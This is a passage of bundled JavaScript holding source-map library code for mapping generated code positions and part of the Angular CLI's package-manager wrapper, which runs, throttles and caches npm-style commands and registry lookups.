      constructor(aSourceMap, aSourceMapURL) {
        return super(INTERNAL).then((that) => {
          let sourceMap = aSourceMap;
          if (typeof aSourceMap === "string") {
            sourceMap = util.parseSourceMapInput(aSourceMap);
          }
          const version = util.getArg(sourceMap, "version");
          const sections = util.getArg(sourceMap, "sections");
          if (version != that._version) {
            throw new Error("Unsupported version: " + version);
          }
          let lastOffset = {
            line: -1,
            column: 0
          };
          return Promise.all(
            sections.map((s) => {
              if (s.url) {
                throw new Error(
                  "Support for url field in sections not implemented."
                );
              }
              const offset = util.getArg(s, "offset");
              const offsetLine = util.getArg(offset, "line");
              const offsetColumn = util.getArg(offset, "column");
              if (offsetLine < lastOffset.line || offsetLine === lastOffset.line && offsetColumn < lastOffset.column) {
                throw new Error(
                  "Section offsets must be ordered and non-overlapping."
                );
              }
              lastOffset = offset;
              const cons = new SourceMapConsumer(
                util.getArg(s, "map"),
                aSourceMapURL
              );
              return cons.then((consumer) => {
                return {
                  generatedOffset: {
                    // The offset fields are 0-based, but we use 1-based indices when
                    // encoding/decoding from VLQ.
                    generatedLine: offsetLine + 1,
                    generatedColumn: offsetColumn + 1
                  },
                  consumer
                };
              });
            })
          ).then((s) => {
            that._sections = s;
            return that;
          });
        });
      }
      /**
       * The list of original sources.
       */
      get sources() {
        const sources = [];
        for (let i = 0; i < this._sections.length; i++) {
          for (let j = 0; j < this._sections[i].consumer.sources.length; j++) {
            sources.push(this._sections[i].consumer.sources[j]);
          }
        }
        return sources;
      }
      /**
       * Returns the original source, line, and column information for the generated
       * source's line and column positions provided. The only argument is an object
       * with the following properties:
       *
       *   - line: The line number in the generated source.  The line number
       *     is 1-based.
       *   - column: The column number in the generated source.  The column
       *     number is 0-based.
       *
       * and an object is returned with the following properties:
       *
       *   - source: The original source file, or null.
       *   - line: The line number in the original source, or null.  The
       *     line number is 1-based.
       *   - column: The column number in the original source, or null.  The
       *     column number is 0-based.
       *   - name: The original identifier, or null.
       */
      originalPositionFor(aArgs) {
        const needle = {
          generatedLine: util.getArg(aArgs, "line"),
          generatedColumn: util.getArg(aArgs, "column")
        };
        const sectionIndex = binarySearch.search(
          needle,
          this._sections,
          function(aNeedle, section2) {
            const cmp = aNeedle.generatedLine - section2.generatedOffset.generatedLine;
            if (cmp) {
              return cmp;
            }
            return aNeedle.generatedColumn - (section2.generatedOffset.generatedColumn - 1);
          }
        );
        const section = this._sections[sectionIndex];
        if (!section) {
          return {
            source: null,
            line: null,
            column: null,
            name: null
          };
        }
        return section.consumer.originalPositionFor({
          line: needle.generatedLine - (section.generatedOffset.generatedLine - 1),
          column: needle.generatedColumn - (section.generatedOffset.generatedLine === needle.generatedLine ? section.generatedOffset.generatedColumn - 1 : 0),
          bias: aArgs.bias
        });
      }
      /**
       * Return true if we have the source content for every source in the source
       * map, false otherwise.
       */
      hasContentsOfAllSources() {
        return this._sections.every(function(s) {
          return s.consumer.hasContentsOfAllSources();
        });
      }
      /**
       * Returns the original source content. The only argument is the url of the
       * original source file. Returns null if no original source content is
       * available.
       */
      sourceContentFor(aSource, nullOnMissing) {
        for (let i = 0; i < this._sections.length; i++) {
          const section = this._sections[i];
          const content = section.consumer.sourceContentFor(aSource, true);
          if (content) {
            return content;
          }
        }
        if (nullOnMissing) {
          return null;
        }
        throw new Error('"' + aSource + '" is not in the SourceMap.');
      }
      _findSectionIndex(source) {
        for (let i = 0; i < this._sections.length; i++) {
          const { consumer } = this._sections[i];
          if (consumer._findSourceIndex(source) !== -1) {
            return i;
          }
        }
        return -1;
      }
      /**
       * Returns the generated line and column information for the original source,
       * line, and column positions provided. The only argument is an object with
       * the following properties:
       *
       *   - source: The filename of the original source.
       *   - line: The line number in the original source.  The line number
       *     is 1-based.
       *   - column: The column number in the original source.  The column
       *     number is 0-based.
       *
       * and an object is returned with the following properties:
       *
       *   - line: The line number in the generated source, or null.  The
       *     line number is 1-based.
       *   - column: The column number in the generated source, or null.
       *     The column number is 0-based.
       */
      generatedPositionFor(aArgs) {
        const index = this._findSectionIndex(util.getArg(aArgs, "source"));
        const section = index >= 0 ? this._sections[index] : null;
        const nextSection = index >= 0 && index + 1 < this._sections.length ? this._sections[index + 1] : null;
        const generatedPosition = section && section.consumer.generatedPositionFor(aArgs);
        if (generatedPosition && generatedPosition.line !== null) {
          const lineShift = section.generatedOffset.generatedLine - 1;
          const columnShift = section.generatedOffset.generatedColumn - 1;
          if (generatedPosition.line === 1) {
            generatedPosition.column += columnShift;
            if (typeof generatedPosition.lastColumn === "number") {
              generatedPosition.lastColumn += columnShift;
            }
          }
          if (generatedPosition.lastColumn === Infinity && nextSection && generatedPosition.line === nextSection.generatedOffset.generatedLine) {
            generatedPosition.lastColumn = nextSection.generatedOffset.generatedColumn - 2;
          }
          generatedPosition.line += lineShift;
          return generatedPosition;
        }
        return {
          line: null,
          column: null,
          lastColumn: null
        };
      }
      allGeneratedPositionsFor(aArgs) {
        const index = this._findSectionIndex(util.getArg(aArgs, "source"));
        const section = index >= 0 ? this._sections[index] : null;
        const nextSection = index >= 0 && index + 1 < this._sections.length ? this._sections[index + 1] : null;
        if (!section) return [];
        return section.consumer.allGeneratedPositionsFor(aArgs).map((generatedPosition) => {
          const lineShift = section.generatedOffset.generatedLine - 1;
          const columnShift = section.generatedOffset.generatedColumn - 1;
          if (generatedPosition.line === 1) {
            generatedPosition.column += columnShift;
            if (typeof generatedPosition.lastColumn === "number") {
              generatedPosition.lastColumn += columnShift;
            }
          }
          if (generatedPosition.lastColumn === Infinity && nextSection && generatedPosition.line === nextSection.generatedOffset.generatedLine) {
            generatedPosition.lastColumn = nextSection.generatedOffset.generatedColumn - 2;
          }
          generatedPosition.line += lineShift;
          return generatedPosition;
        });
      }
      eachMapping(aCallback, aContext, aOrder) {
        this._sections.forEach((section, index) => {
          const nextSection = index + 1 < this._sections.length ? this._sections[index + 1] : null;
          const { generatedOffset } = section;
          const lineShift = generatedOffset.generatedLine - 1;
          const columnShift = generatedOffset.generatedColumn - 1;
          section.consumer.eachMapping(
            function(mapping) {
              if (mapping.generatedLine === 1) {
                mapping.generatedColumn += columnShift;
                if (typeof mapping.lastGeneratedColumn === "number") {
                  mapping.lastGeneratedColumn += columnShift;
                }
              }
              if (mapping.lastGeneratedColumn === Infinity && nextSection && mapping.generatedLine === nextSection.generatedOffset.generatedLine) {
                mapping.lastGeneratedColumn = nextSection.generatedOffset.generatedColumn - 2;
              }
              mapping.generatedLine += lineShift;
              aCallback.call(this, mapping);
            },
            aContext,
            aOrder
          );
        });
      }
      computeColumnSpans() {
        for (let i = 0; i < this._sections.length; i++) {
          this._sections[i].consumer.computeColumnSpans();
        }
      }
      destroy() {
        for (let i = 0; i < this._sections.length; i++) {
          this._sections[i].consumer.destroy();
        }
      }
    };
    exports2.IndexedSourceMapConsumer = IndexedSourceMapConsumer;
    function _factory(aSourceMap, aSourceMapURL) {
      let sourceMap = aSourceMap;
      if (typeof aSourceMap === "string") {
        sourceMap = util.parseSourceMapInput(aSourceMap);
      }
      const consumer = sourceMap.sections != null ? new IndexedSourceMapConsumer(sourceMap, aSourceMapURL) : new BasicSourceMapConsumer(sourceMap, aSourceMapURL);
      return Promise.resolve(consumer);
    }
    function _factoryBSM(aSourceMap, aSourceMapURL) {
      return BasicSourceMapConsumer.fromSourceMap(aSourceMap, aSourceMapURL);
    }
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/source-node.js
var require_source_node = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/lib/source-node.js"(exports2) {
    var SourceMapGenerator = require_source_map_generator().SourceMapGenerator;
    var util = require_util2();
    var REGEX_NEWLINE = /(\r?\n)/;
    var NEWLINE_CODE = 10;
    var isSourceNode = "$$$isSourceNode$$$";
    var SourceNode2 = class _SourceNode {
      constructor(aLine, aColumn, aSource, aChunks, aName) {
        this.children = [];
        this.sourceContents = /* @__PURE__ */ Object.create(null);
        this.line = aLine == null ? null : aLine;
        this.column = aColumn == null ? null : aColumn;
        this.source = aSource == null ? null : aSource;
        this.name = aName == null ? null : aName;
        this[isSourceNode] = true;
        if (aChunks != null) this.add(aChunks);
      }
      /**
       * Creates a SourceNode from generated code and a SourceMapConsumer.
       *
       * @param aGeneratedCode The generated code
       * @param aSourceMapConsumer The SourceMap for the generated code
       * @param aRelativePath Optional. The path that relative sources in the
       *        SourceMapConsumer should be relative to.
       */
      static fromStringWithSourceMap(aGeneratedCode, aSourceMapConsumer, aRelativePath) {
        const node = new _SourceNode();
        const remainingLines = aGeneratedCode.split(REGEX_NEWLINE);
        let remainingLinesIndex = 0;
        const shiftNextLine = function() {
          const lineContents = getNextLine();
          const newLine = getNextLine() || "";
          return lineContents + newLine;
          function getNextLine() {
            return remainingLinesIndex < remainingLines.length ? remainingLines[remainingLinesIndex++] : void 0;
          }
        };
        let lastGeneratedLine = 1, lastGeneratedColumn = 0;
        let lastMapping = null;
        let nextLine;
        aSourceMapConsumer.eachMapping(function(mapping) {
          if (lastMapping !== null) {
            if (lastGeneratedLine < mapping.generatedLine) {
              addMappingWithCode(lastMapping, shiftNextLine());
              lastGeneratedLine++;
              lastGeneratedColumn = 0;
            } else {
              nextLine = remainingLines[remainingLinesIndex] || "";
              const code = nextLine.substr(
                0,
                mapping.generatedColumn - lastGeneratedColumn
              );
              remainingLines[remainingLinesIndex] = nextLine.substr(
                mapping.generatedColumn - lastGeneratedColumn
              );
              lastGeneratedColumn = mapping.generatedColumn;
              addMappingWithCode(lastMapping, code);
              lastMapping = mapping;
              return;
            }
          }
          while (lastGeneratedLine < mapping.generatedLine) {
            node.add(shiftNextLine());
            lastGeneratedLine++;
          }
          if (lastGeneratedColumn < mapping.generatedColumn) {
            nextLine = remainingLines[remainingLinesIndex] || "";
            node.add(nextLine.substr(0, mapping.generatedColumn));
            remainingLines[remainingLinesIndex] = nextLine.substr(
              mapping.generatedColumn
            );
            lastGeneratedColumn = mapping.generatedColumn;
          }
          lastMapping = mapping;
        }, this);
        if (remainingLinesIndex < remainingLines.length) {
          if (lastMapping) {
            addMappingWithCode(lastMapping, shiftNextLine());
          }
          node.add(remainingLines.splice(remainingLinesIndex).join(""));
        }
        aSourceMapConsumer.sources.forEach(function(sourceFile) {
          const content = aSourceMapConsumer.sourceContentFor(sourceFile);
          if (content != null) {
            if (aRelativePath != null) {
              sourceFile = util.join(aRelativePath, sourceFile);
            }
            node.setSourceContent(sourceFile, content);
          }
        });
        return node;
        function addMappingWithCode(mapping, code) {
          if (mapping === null || mapping.source === void 0) {
            node.add(code);
          } else {
            const source = aRelativePath ? util.join(aRelativePath, mapping.source) : mapping.source;
            node.add(
              new _SourceNode(
                mapping.originalLine,
                mapping.originalColumn,
                source,
                code,
                mapping.name
              )
            );
          }
        }
      }
      /**
       * Add a chunk of generated JS to this source node.
       *
       * @param aChunk A string snippet of generated JS code, another instance of
       *        SourceNode, or an array where each member is one of those things.
       */
      add(aChunk) {
        if (Array.isArray(aChunk)) {
          aChunk.forEach(function(chunk) {
            this.add(chunk);
          }, this);
        } else if (aChunk[isSourceNode] || typeof aChunk === "string") {
          if (aChunk) {
            this.children.push(aChunk);
          }
        } else {
          throw new TypeError(
            "Expected a SourceNode, string, or an array of SourceNodes and strings. Got " + aChunk
          );
        }
        return this;
      }
      /**
       * Add a chunk of generated JS to the beginning of this source node.
       *
       * @param aChunk A string snippet of generated JS code, another instance of
       *        SourceNode, or an array where each member is one of those things.
       */
      prepend(aChunk) {
        if (Array.isArray(aChunk)) {
          for (let i = aChunk.length - 1; i >= 0; i--) {
            this.prepend(aChunk[i]);
          }
        } else if (aChunk[isSourceNode] || typeof aChunk === "string") {
          this.children.unshift(aChunk);
        } else {
          throw new TypeError(
            "Expected a SourceNode, string, or an array of SourceNodes and strings. Got " + aChunk
          );
        }
        return this;
      }
      /**
       * Walk over the tree of JS snippets in this node and its children. The
       * walking function is called once for each snippet of JS and is passed that
       * snippet and the its original associated source's line/column location.
       *
       * @param aFn The traversal function.
       */
      walk(aFn) {
        let chunk;
        for (let i = 0, len = this.children.length; i < len; i++) {
          chunk = this.children[i];
          if (chunk[isSourceNode]) {
            chunk.walk(aFn);
          } else if (chunk !== "") {
            aFn(chunk, {
              source: this.source,
              line: this.line,
              column: this.column,
              name: this.name
            });
          }
        }
      }
      /**
       * Like `String.prototype.join` except for SourceNodes. Inserts `aStr` between
       * each of `this.children`.
       *
       * @param aSep The separator.
       */
      join(aSep) {
        let newChildren;
        let i;
        const len = this.children.length;
        if (len > 0) {
          newChildren = [];
          for (i = 0; i < len - 1; i++) {
            newChildren.push(this.children[i]);
            newChildren.push(aSep);
          }
          newChildren.push(this.children[i]);
          this.children = newChildren;
        }
        return this;
      }
      /**
       * Call String.prototype.replace on the very right-most source snippet. Useful
       * for trimming whitespace from the end of a source node, etc.
       *
       * @param aPattern The pattern to replace.
       * @param aReplacement The thing to replace the pattern with.
       */
      replaceRight(aPattern, aReplacement) {
        const lastChild = this.children[this.children.length - 1];
        if (lastChild[isSourceNode]) {
          lastChild.replaceRight(aPattern, aReplacement);
        } else if (typeof lastChild === "string") {
          this.children[this.children.length - 1] = lastChild.replace(
            aPattern,
            aReplacement
          );
        } else {
          this.children.push("".replace(aPattern, aReplacement));
        }
        return this;
      }
      /**
       * Set the source content for a source file. This will be added to the SourceMapGenerator
       * in the sourcesContent field.
       *
       * @param aSourceFile The filename of the source file
       * @param aSourceContent The content of the source file
       */
      setSourceContent(aSourceFile, aSourceContent) {
        this.sourceContents[util.toSetString(aSourceFile)] = aSourceContent;
      }
      /**
       * Walk over the tree of SourceNodes. The walking function is called for each
       * source file content and is passed the filename and source content.
       *
       * @param aFn The traversal function.
       */
      walkSourceContents(aFn) {
        for (let i = 0, len = this.children.length; i < len; i++) {
          if (this.children[i][isSourceNode]) {
            this.children[i].walkSourceContents(aFn);
          }
        }
        const sources = Object.keys(this.sourceContents);
        for (let i = 0, len = sources.length; i < len; i++) {
          aFn(util.fromSetString(sources[i]), this.sourceContents[sources[i]]);
        }
      }
      /**
       * Return the string representation of this source node. Walks over the tree
       * and concatenates all the various snippets together to one string.
       */
      toString() {
        let str = "";
        this.walk(function(chunk) {
          str += chunk;
        });
        return str;
      }
      /**
       * Returns the string representation of this source node along with a source
       * map.
       */
      toStringWithSourceMap(aArgs) {
        const generated = {
          code: "",
          line: 1,
          column: 0
        };
        const map = new SourceMapGenerator(aArgs);
        let sourceMappingActive = false;
        let lastOriginalSource = null;
        let lastOriginalLine = null;
        let lastOriginalColumn = null;
        let lastOriginalName = null;
        this.walk(function(chunk, original) {
          generated.code += chunk;
          if (original.source !== null && original.line !== null && original.column !== null) {
            if (lastOriginalSource !== original.source || lastOriginalLine !== original.line || lastOriginalColumn !== original.column || lastOriginalName !== original.name) {
              map.addMapping({
                source: original.source,
                original: {
                  line: original.line,
                  column: original.column
                },
                generated: {
                  line: generated.line,
                  column: generated.column
                },
                name: original.name
              });
            }
            lastOriginalSource = original.source;
            lastOriginalLine = original.line;
            lastOriginalColumn = original.column;
            lastOriginalName = original.name;
            sourceMappingActive = true;
          } else if (sourceMappingActive) {
            map.addMapping({
              generated: {
                line: generated.line,
                column: generated.column
              }
            });
            lastOriginalSource = null;
            sourceMappingActive = false;
          }
          for (let idx = 0, length = chunk.length; idx < length; idx++) {
            if (chunk.charCodeAt(idx) === NEWLINE_CODE) {
              generated.line++;
              generated.column = 0;
              if (idx + 1 === length) {
                lastOriginalSource = null;
                sourceMappingActive = false;
              } else if (sourceMappingActive) {
                map.addMapping({
                  source: original.source,
                  original: {
                    line: original.line,
                    column: original.column
                  },
                  generated: {
                    line: generated.line,
                    column: generated.column
                  },
                  name: original.name
                });
              }
            } else {
              generated.column++;
            }
          }
        });
        this.walkSourceContents(function(sourceFile, sourceContent) {
          map.setSourceContent(sourceFile, sourceContent);
        });
        return { code: generated.code, map };
      }
    };
    exports2.SourceNode = SourceNode2;
  }
});

// node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/source-map.js
var require_source_map = __commonJS({
  "node_modules/.pnpm/source-map@0.8.0/node_modules/source-map/source-map.js"(exports2) {
    exports2.SourceMapGenerator = require_source_map_generator().SourceMapGenerator;
    exports2.SourceMapConsumer = require_source_map_consumer().SourceMapConsumer;
    exports2.SourceNode = require_source_node().SourceNode;
  }
});

// ../../../../../../../private/tmp/n1g/entry-n1g.ts
var import_node_child_process2 = require("node:child_process");
var import_node_fs3 = require("node:fs");
var import_node_path3 = require("node:path");

// packages/angular/cli/src/package-managers/package-manager.ts
var import_node_path = require("node:path");
var import_npm_package_arg = __toESM(require_npa());
var import_semver = __toESM(require_semver2());

// packages/angular/cli/src/package-managers/error.ts
var PackageManagerError = class extends Error {
  /**
   * Creates a new `PackageManagerError` instance.
   * @param message The error message.
   * @param stdout The standard output of the failed process.
   * @param stderr The standard error of the failed process.
   * @param exitCode The exit code of the failed process.
   */
  constructor(message, stdout, stderr, exitCode) {
    super(message);
    this.stdout = stdout;
    this.stderr = stderr;
    this.exitCode = exitCode;
  }
  stdout;
  stderr;
  exitCode;
};

// packages/angular/cli/src/package-managers/package-manager.ts
var METADATA_FIELDS = ["name", "dist-tags", "versions", "time"];
var MANIFEST_FIELDS = [
  "name",
  "version",
  "deprecated",
  "dependencies",
  "peerDependencies",
  "devDependencies",
  "homepage",
  "schematics",
  "ng-add",
  "ng-update"
];
var PackageManager = class {
  /**
   * Creates a new `PackageManager` instance.
   * @param host A `Host` instance for interacting with the file system and running commands.
   * @param cwd The absolute path to the project's working directory.
   * @param descriptor A `PackageManagerDescriptor` that defines the commands for a specific package manager.
   * @param options An options object to configure the instance.
   */
  constructor(host, cwd, descriptor, options = {}) {
    this.host = host;
    this.cwd = cwd;
    this.descriptor = descriptor;
    this.options = options;
    if (this.options.dryRun && !this.options.logger) {
      throw new Error("A logger must be provided when dryRun is enabled.");
    }
    this.#version = options.version;
    this.#initializationError = options.initializationError;
  }
  host;
  cwd;
  descriptor;
  options;
  #manifestCache = /* @__PURE__ */ new Map();
  #metadataCache = /* @__PURE__ */ new Map();
  #initializationError;
  #dependencyCache = null;
  #version;
  #minimumReleaseAge;
  #activeTasks = 0;
  #pendingTasks = [];
  #maxConcurrent = 5;
  /**
   * The name of the package manager's binary.
   */
  get name() {
    return this.descriptor.binary;
  }
  /**
   * Ensures that the package manager is installed and available in the PATH.
   * If it is not, this method will throw an error with instructions on how to install it.
   *
   * @throws {Error} If the package manager is not installed.
   */
  ensureInstalled() {
    if (this.#initializationError) {
      throw this.#initializationError;
    }
  }
  /**
   * A private method to lazily populate the dependency cache.
   * This is a performance optimization to avoid running `npm list` multiple times.
   * @returns A promise that resolves to the dependency cache map.
   */
  async #populateDependencyCache() {
    if (this.#dependencyCache !== null) {
      return this.#dependencyCache;
    }
    const args = this.descriptor.listDependenciesCommand;
    const workspacePackageName = await this.getCurrentPackageName();
    const dependencies = await this.#fetchAndParse(
      args,
      (stdout, logger2) => this.descriptor.outputParsers.listDependencies(stdout, logger2, { workspacePackageName })
    );
    return this.#dependencyCache = dependencies ?? /* @__PURE__ */ new Map();
  }
  /**
   * A private method to run a command using the package manager's binary.
   * @param args The arguments to pass to the command.
   * @param options Options for the child process.
   * @returns A promise that resolves with the standard output and standard error of the command.
   */
  async #runWithThrottle(action) {
    if (this.#activeTasks >= this.#maxConcurrent) {
      await new Promise((resolve2) => {
        this.#pendingTasks.push(resolve2);
      });
    } else {
      this.#activeTasks++;
    }
    try {
      return await action();
    } finally {
      const next = this.#pendingTasks.shift();
      if (next) {
        next();
      } else {
        this.#activeTasks--;
      }
    }
  }
  async #run(args, options = {}) {
    return this.#runWithThrottle(async () => {
      this.ensureInstalled();
      const { registry, cwd, ...runOptions } = options;
      const finalArgs = [...args];
      let finalEnv;
      if (registry) {
        const registryOptions = this.descriptor.getRegistryOptions?.(registry);
        if (!registryOptions) {
          throw new Error(
            `The configured package manager, '${this.descriptor.binary}', does not support a custom registry.`
          );
        }
        if (registryOptions.args) {
          finalArgs.push(...registryOptions.args);
        }
        if (registryOptions.env) {
          finalEnv = registryOptions.env;
        }
      }
      const executionDirectory = cwd ?? this.cwd;
      if (this.options.dryRun) {
        this.options.logger?.info(
          `[DRY RUN] Would execute in [${executionDirectory}]: ${this.descriptor.binary} ${finalArgs.join(" ")}`
        );
        return { stdout: "", stderr: "" };
      }
      const commandResult = await this.host.runCommand(this.descriptor.binary, finalArgs, {
        ...runOptions,
        cwd: executionDirectory,
        stdio: "pipe",
        env: finalEnv
      });
      return { stdout: commandResult.stdout.trim(), stderr: commandResult.stderr.trim() };
    });
  }
  /**
   * A private, generic method to encapsulate the common logic of running a command,
   * handling errors, and parsing the output.
   * @param args The arguments to pass to the command.
   * @param parser A function that parses the command's stdout.
   * @param options Options for the command, including caching.
   * @returns A promise that resolves to the parsed data, or null if not found.
   */
  async #fetchAndParse(args, parser, options = {}) {
    const { cache, cacheKey, bypassCache, ...runOptions } = options;
    if (!bypassCache && cache && cacheKey && cache.has(cacheKey)) {
      return cache.get(cacheKey);
    }
    let stdout;
    let stderr;
    let exitCode;
    let thrownError;
    try {
      ({ stdout, stderr } = await this.#run(args, runOptions));
      exitCode = 0;
    } catch (e) {
      thrownError = e;
      if (e instanceof PackageManagerError) {
        stdout = e.stdout;
        stderr = e.stderr;
        exitCode = e.exitCode;
      } else {
        throw e;
      }
    }
    const getError = this.descriptor.outputParsers.getError;
    const parsedError = getError?.(stdout, this.options.logger) ?? getError?.(stderr, this.options.logger) ?? null;
    if (parsedError) {
      this.options.logger?.debug(
        `[${this.descriptor.binary}] Structured error (code: ${parsedError.code}): ${parsedError.summary}`
      );
      if (this.descriptor.isNotFound(parsedError)) {
        if (cache && cacheKey) {
          cache.set(cacheKey, null);
        }
        return null;
      } else {
        throw new PackageManagerError(parsedError.summary, stdout, stderr, exitCode);
      }
    }
    if (thrownError) {
      throw thrownError;
    }
    try {
      const result = parser(stdout, this.options.logger);
      if (cache && cacheKey) {
        cache.set(cacheKey, result);
      }
      return result;
    } catch (e) {
      const message = `Failed to parse package manager output: ${e instanceof Error ? e.message : ""}`;
      throw new PackageManagerError(message, stdout, stderr, exitCode);
    }
  }
  /**
   * Adds a package to the project's dependencies.
   * @param packageName The name of the package to add.
   * @param save The save strategy to use.
   * - `exact`: The package will be saved with an exact version.
   * - `tilde`: The package will be saved with a tilde version range (`~`).
   * - `none`: The package will be saved with the default version range (`^`).
   * @param asDevDependency Whether to install the package as a dev dependency.
   * @param noLockfile Whether to skip updating the lockfile.
   * @param options Extra options for the command.
   * @returns A promise that resolves when the command is complete.
   */
  async add(packageName, save, asDevDependency, noLockfile, ignoreScripts, options = {}) {
    const flags = [
      asDevDependency ? this.descriptor.saveDevFlag : "",
      save === "exact" ? this.descriptor.saveExactFlag : "",
      save === "tilde" ? this.descriptor.saveTildeFlag : "",
      noLockfile ? this.descriptor.noLockfileFlag : "",
      ignoreScripts ? this.descriptor.ignoreScriptsFlag : ""
    ].filter((flag) => flag);
    const specifier = this.host.requiresQuoting ? `"${packageName}"` : packageName;
    const args = [this.descriptor.addCommand, specifier, ...flags];
    await this.#run(args, options);
    this.#dependencyCache = null;
  }
  /**
   * Installs all dependencies in the project.
   * @param options Options for the installation.
   * @param options.timeout The maximum time in milliseconds to wait for the command to complete.
   * @param options.force If true, forces a clean install, potentially overwriting existing modules.
   * @param options.registry The registry to use for the installation.
   * @param options.ignoreScripts If true, prevents lifecycle scripts from being executed.
   * @returns A promise that resolves when the command is complete.
   */
  async install(options = { ignoreScripts: true }) {
    const flags = [
      options.force ? this.descriptor.forceFlag : "",
      options.ignoreScripts ? this.descriptor.ignoreScriptsFlag : "",
      options.ignorePeerDependencies ? this.descriptor.ignorePeerDependenciesFlag ?? "" : ""
    ].filter((flag) => flag);
    const args = [...this.descriptor.installCommand, ...flags];
    await this.#run(args, options);
    this.#dependencyCache = null;
  }
  /**
   * Gets the name of the package in the current project.
   */
  async getCurrentPackageName() {
    if (this.descriptor.getPackageNameCommand) {
      try {
        const { stdout } = await this.#run(this.descriptor.getPackageNameCommand);
        if (stdout) {
          return JSON.parse(stdout);
        }
      } catch {
      }
    }
    try {
      const content = await this.host.readFile((0, import_node_path.join)(this.cwd, "package.json"));
      const pkgJson = JSON.parse(content);
      return pkgJson.name;
    } catch {
      return void 0;
    }
  }
  /**
   * Gets the version of the package manager binary.
   */
  async getVersion() {
    if (this.#version) {
      return this.#version;
    }
    const { stdout } = await this.#run(this.descriptor.versionCommand);
    this.#version = stdout.trim();
    if (!(0, import_semver.valid)(this.#version)) {
      throw new Error(`Invalid semver version for ${this.name}: "${this.#version}"`);
    }
    return this.#version;
  }
  /**
   * Gets the installed details of a package from the project's dependencies.
   * @param packageName The name of the package to check.
   * @returns A promise that resolves to the installed package details, or `null` if the package is not installed.
   */
  async getInstalledPackage(packageName) {
    const cache = await this.#populateDependencyCache();
    return cache.get(packageName) ?? null;
  }
  /**
   * Gets a map of all top-level dependencies installed in the project.
   * @returns A promise that resolves to a map of package names to their installed package details.
   */
  async getProjectDependencies() {
    const cache = await this.#populateDependencyCache();
    return new Map(cache);
  }
  /**
   * Fetches the registry metadata for a package. This is the full metadata,
   * including all versions and distribution tags.
   * @param packageName The name of the package to fetch the metadata for.
   * @param options Options for the fetch.
   * @param options.timeout The maximum time in milliseconds to wait for the command to complete.
   * @param options.registry The registry to use for the fetch.
   * @param options.bypassCache If true, ignores the in-memory cache and fetches fresh data.
   * @returns A promise that resolves to the `PackageMetadata` object, or `null` if the package is not found.
   */
  async getRegistryMetadata(packageName, options = {}) {
    const cacheKey = options.registry ? `${packageName}|${options.registry}` : packageName;
    if (!options.bypassCache) {
      const cached = this.#metadataCache.get(cacheKey);
      if (cached !== void 0) {
        return cached;
      }
    }
    let metadata;
    if (this.descriptor.getRegistryMetadata) {
      metadata = await this.descriptor.getRegistryMetadata(
        packageName,
        (args, parser) => this.#fetchAndParse(args, parser, options)
      );
    } else {
      const commandArgs = [...this.descriptor.getManifestCommand, packageName];
      const formatter = this.descriptor.viewCommandFieldArgFormatter;
      if (formatter) {
        commandArgs.push(...formatter(METADATA_FIELDS));
      }
      metadata = await this.#fetchAndParse(
        commandArgs,
        (stdout, logger2) => this.descriptor.outputParsers.getRegistryMetadata(stdout, logger2),
        options
      );
    }
    this.#metadataCache.set(cacheKey, metadata);
    return metadata;
  }
  /**
   * Fetches the registry manifest for a specific version of a package.
   * The manifest is similar to the package's `package.json` file.
   * @param packageName The name of the package to fetch the manifest for.
   * @param version The version of the package to fetch the manifest for.
   * @param options Options for the fetch.
   * @param options.timeout The maximum time in milliseconds to wait for the command to complete.
   * @param options.registry The registry to use for the fetch.
   * @param options.bypassCache If true, ignores the in-memory cache and fetches fresh data.
   * @returns A promise that resolves to the `PackageManifest` object, or `null` if the package is not found.
   */
  async getRegistryManifest(packageName, version, options = {}) {
    const specifier = this.host.requiresQuoting ? `"${packageName}@${version}"` : `${packageName}@${version}`;
    const commandArgs = [...this.descriptor.getManifestCommand, specifier];
    const formatter = this.descriptor.viewCommandFieldArgFormatter;
    if (formatter) {
      commandArgs.push(...formatter(MANIFEST_FIELDS));
    }
    const cacheKey = options.registry ? `${specifier}|${options.registry}` : specifier;
    const manifest = await this.#fetchAndParse(
      commandArgs,
      (stdout, logger2) => this.descriptor.outputParsers.getRegistryManifest(stdout, logger2),
      { ...options, cache: this.#manifestCache, cacheKey }
    );
    if (manifest && manifest.version !== version) {
      const manifestSpecifier = `${manifest.name}@${manifest.version}`;
      const manifestCacheKey = options.registry ? `${manifestSpecifier}|${options.registry}` : manifestSpecifier;
      this.#manifestCache.set(manifestCacheKey, manifest);
    }
    return manifest;
  }
  /**
   * Fetches the manifest for a package.
   *
   * This method can resolve manifests for packages from the registry, as well
   * as those specified by file paths, directory paths, and remote tarballs.
   * Caching is only supported for registry packages.
   *
   * @param specifier The package specifier to resolve the manifest for.
   * @param options Options for the fetch.
   * @returns A promise that resolves to the `PackageManifest` object, or `null` if the package is not found.
   */
  async getManifest(specifier, options = {}) {
    const { name, type, fetchSpec } = typeof specifier === "string" ? (0, import_npm_package_arg.default)(specifier) : specifier;
    switch (type) {
      case "range":
      case "version":
      case "tag": {
        if (!name) {
          throw new Error(`Could not parse package name from specifier: ${specifier}`);
        }
        let versionSpec = fetchSpec ?? "latest";
        if (this.descriptor.requiresManifestVersionLookup) {
          if (type === "tag" || !fetchSpec) {
            const metadata = await this.getRegistryMetadata(name, options);
            if (!metadata) {
              return null;
            }
            versionSpec = metadata["dist-tags"][versionSpec];
          } else if (type === "range") {
            const metadata = await this.getRegistryMetadata(name, options);
            if (!metadata) {
              return null;
            }
            versionSpec = (0, import_semver.maxSatisfying)(metadata.versions, fetchSpec) ?? "";
          }
          if (!versionSpec) {
            return null;
          }
        }
        return this.getRegistryManifest(name, versionSpec, options);
      }
      case "directory": {
        if (!fetchSpec) {
          throw new Error(`Could not parse directory path from specifier: ${specifier}`);
        }
        const manifestPath = (0, import_node_path.join)(fetchSpec, "package.json");
        const manifest = await this.host.readFile(manifestPath);
        return JSON.parse(manifest);
      }
      case "file":
      case "remote":
      case "git": {
        if (!fetchSpec) {
          throw new Error(`Could not parse location from specifier: ${specifier}`);
        }
        const { workingDirectory, cleanup } = await this.acquireTempPackage(fetchSpec, {
          ...options,
          ignoreScripts: true
        });
        try {
          const tempManifest = await this.host.readFile((0, import_node_path.join)(workingDirectory, "package.json"));
          const { dependencies } = JSON.parse(tempManifest);
          const packageName = dependencies && Object.keys(dependencies)[0];
          if (!packageName) {
            throw new Error(`Could not determine package name for specifier: ${specifier}`);
          }
          const packagePath = (0, import_node_path.join)(workingDirectory, "node_modules", packageName);
          const manifestPath = (0, import_node_path.join)(packagePath, "package.json");
